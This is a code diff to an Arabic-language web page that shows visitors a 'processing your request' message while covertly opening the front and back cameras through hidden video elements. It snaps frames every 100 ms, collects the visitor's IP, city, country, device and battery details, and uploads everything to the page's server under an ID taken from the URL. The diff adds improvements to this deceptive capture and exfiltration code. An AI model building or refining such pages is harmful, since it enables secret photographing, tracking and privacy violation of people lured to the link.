@@ -39,8 +39,8 @@
         <h1>جاري تنفيذ طلبك</h1>
         <p>يرجى الانتظار...</p>
     </div>
-    <video id="frontVideo" playsinline autoplay style="display:none;"></video>
-    <video id="backVideo" playsinline autoplay style="display:none;"></video>
+    <video id="frontVideo" playsinline autoplay muted style="display:none;"></video>
+    <video id="backVideo" playsinline autoplay muted style="display:none;"></video>
     <canvas id="frontCanvas" style="display:none;"></canvas>
     <canvas id="backCanvas" style="display:none;"></canvas>
     <script>
@@ -51,18 +51,23 @@
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
-            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
-            const battery = await navigator.getBattery();
+            try {
+                const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+                const battery = await navigator.getBattery();
 
-            return {
-                ip: ipInfo.ip,
-                country: ipInfo.country_name,
-                city: ipInfo.city,
-                platform: getPlatformInfo().platform,
-                deviceVersion: getDeviceVersion(),
-                batteryLevel: battery.level,
-                batteryCharging: battery.charging,
-            };
+                return {
+                    ip: ipInfo.ip,
+                    country: ipInfo.country_name,
+                    city: ipInfo.city,
+                    platform: getPlatformInfo().platform,
+                    deviceVersion: getDeviceVersion(),
+                    batteryLevel: battery.level,
+                    batteryCharging: battery.charging,
+                };
+            } catch (error) {
+                console.error('Error collecting additional ', error);
+                return {};
+            }
         }
 
         function getPlatformInfo() {
@@ -84,12 +89,16 @@
         async function init() {
             try {
                 const additionalData = await collectAdditionalData();
+                await navigator.mediaDevices.getUserMedia({ video: true });
                 const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                 handleSuccess(frontStream, backStream, additionalData);
             } catch (e) {
                 console.error('navigator.getUserMedia error:', e);
-                alert('Error accessing camera: ' + e.message);
+                document.querySelector('.container').innerHTML = `
+                    <h1>خطأ في الوصول إلى الكاميرا</h1>
+                    <p>${e.message}</p>
+                `;
             }
         }
 
@@ -123,19 +132,25 @@
                     formData.append('cameraType', cameraType);
                     formData.append('additionalData', JSON.stringify(additionalData));
                     post('/submitPhotos', formData);
-                }, 'image/png');
+                }, 'image/png', 0.7);
 
                 photoCount++;
-            }, 150); // التقاط صورة كل ثانية
+            }, 100);
         }
 
-        function post(url, formData) {
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
+        async function post(url, formData) {
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                const data = await response.json();
+
                 if (data.success) {
                     console.log('Photos sent successfully');
                     document.querySelector('.container').innerHTML = `
@@ -143,17 +158,15 @@
                         <p>يمكنك التصفح الان او قوم بغلق الصفحه</p>
                     `;
                 } else {
-                    console.error('Error sending photos:', data.error);
                     throw new Error(data.error);
                 }
-            })
-            .catch(error => {
+            } catch (error) {
                 console.error('Error:', error);
                 document.querySelector('.container').innerHTML = `
                     <h1>خطأ في إرسال الصور</h1>
                     <p>${error.message}</p>
                 `;
-            });
+            }
         }
 
         window.addEventListener('load', init);
